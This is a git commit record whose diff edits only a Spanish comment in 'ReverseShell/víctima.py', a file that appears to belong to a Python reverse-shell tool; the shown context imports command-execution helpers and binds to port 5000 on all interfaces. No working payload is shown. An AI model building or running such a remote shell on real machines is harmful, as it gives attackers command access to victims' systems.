70ffc23c915dd967e086627cd61b9095f1c7777c
JoseGeek78 <josemariarodriguez78@gmail.com>
2024-10-12 08:17:13 +0200

    .

--- ReverseShell/víctima.py
+++ ReverseShell/víctima.py
@@ -3,5 +3,5 @@ from subprocess import getoutput
 from os import chdir, getcwd
 from time import sleep
 
-# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
+# Definimos  dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
 server_address = ('0.0.0.0', 5000)
